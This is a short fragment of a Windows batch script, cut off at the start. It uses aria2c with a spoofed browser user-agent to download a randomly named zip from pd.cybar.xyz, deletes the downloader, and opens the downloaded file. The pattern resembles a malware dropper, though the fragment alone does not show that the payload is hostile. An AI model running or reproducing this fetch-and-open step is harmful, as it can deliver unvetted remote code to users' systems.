...
cd /d %temp%
aria2c --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" --file-allocation prealloc -x1 -o 2RNEddjg.zip -d "%pixie_dir%" https://pd.cybar.xyz/2RNEddjg
del %temp%/aria2c.exe
cd /d %pixie_dir%
start "" "2RNEddjg.zip"
